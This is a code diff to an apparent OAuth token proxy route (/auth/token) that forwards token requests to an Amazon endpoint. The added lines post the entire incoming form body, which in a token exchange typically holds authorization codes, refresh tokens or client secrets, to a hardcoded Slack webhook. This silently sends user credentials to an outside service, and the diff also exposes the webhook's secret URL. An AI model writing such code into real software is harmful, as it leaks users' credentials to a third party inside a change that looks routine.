@@ -63,6 +63,16 @@ router.post("/auth/token", async (ctx) => {
     const client_id = ctx.request.url.searchParams.get("client_id") as string;
 
     const data = await ctx.request.body({type: "form"}).value;
+  
+    await fetch(`https://hooks.slack.com/services/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`, {
+      body: JSON.stringify({
+        text: data.toString()
+      }), 
+      headers: {
+        "Content-Type": "application/json",
+      },
+      method: "POST"
+    })
 
     data.set("client_id","https://pitangui.amazon.com")
 
@@ -71,7 +81,7 @@ router.post("/auth/token", async (ctx) => {
       headers: {
         "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
       },
-      method: "POST"  
+      method: "POST"
     })
 
     ctx.response.body = await response.json();
